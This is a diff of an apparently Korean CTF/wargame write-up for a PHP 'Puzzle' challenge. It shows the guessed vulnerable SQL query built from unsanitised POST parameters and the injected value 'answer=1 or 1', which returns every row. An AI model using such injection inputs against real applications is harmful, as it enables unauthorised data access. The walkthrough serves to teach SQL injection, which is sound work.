@@ -23,9 +23,9 @@
             "server" -> step1 -> step3 -> step5 -> step7 -> step9;
         }
         step0 -> step1[label="post_data: {answer=1&id=1}",arrowhead="normal"];
-        step3 -> step2[label="select id,answer,ip from $table_name where id=1 and answer=1",arrowhead="normal"];
+        step3 -> step2[label="Error Page",arrowhead="normal"];
         step4 -> step5[label="post_data: {answer=1 or 1&id=1}",arrowhead="normal"];
-        step7 -> step6[label="select id,answer,ip from $table_name where id=1 and answer=1 or 1",arrowhead="normal"];
+        step7 -> step6[label="login success",arrowhead="normal"];
     }
 
 |
@@ -47,19 +47,16 @@ MISC
 
 |
 
-취약점 존재 여부 확인
+server -> DB 예측
 ================================================================================================================
 
-- POST 페이지 취약점
 - POST 파라미터: answer, id
 
-.. code-block:: html
+.. code-block:: sql
 
-    <form name=kk method=get action=index.php>
-    </form><form method=post action=index.php>
-    <input type=hidden name=answer value=1010100000011100101011111>
-    name : <input type=text name=id maxlength=10 size=10>
-    <input type=submit value='write'>
+    select id, answer, ip from $table_name where 
+    id= $_POST[id] and 
+    answer = $_POST[answer]
 
 |
 
@@ -88,17 +85,6 @@ POST Parameter
 
 .. code-block:: html
 
-    <html>
-    <head>
-    <title>Challenge 3</title>
-    </head>
-    <body>
-    <center>Puzzle</center>
-    <p>
-    <hr>
-
-    <form name=kk method=get action=index.php>
-
     <p>name : 1<br>
     answer : 1<br>
     ip : 125.x.x.x<hr><p>
@@ -120,20 +106,16 @@ POST Parameter
 
 |
 
-Expected SQL Query 
+or
 ================================================================================================================
-
-.. code-block:: sql
-    
-    select id, answer, ip from $table_name where id= $_POST[id] and answer = $_POST[answer]
-
-|
-
 
 $_POST[answer]에 참인 값을 or 형식으로 넣어주면 모든 answer 출력 결과를 얻을 수 있다.
 
 .. code-block:: sql
     
-    select id, answer, ip from $table_name where id= $_POST[id] and answer = 1 or 1
+    select id, answer, ip from $table_name where 
+    id= $_POST[id] and 
+    answer = 1 or 1
 
 
+|
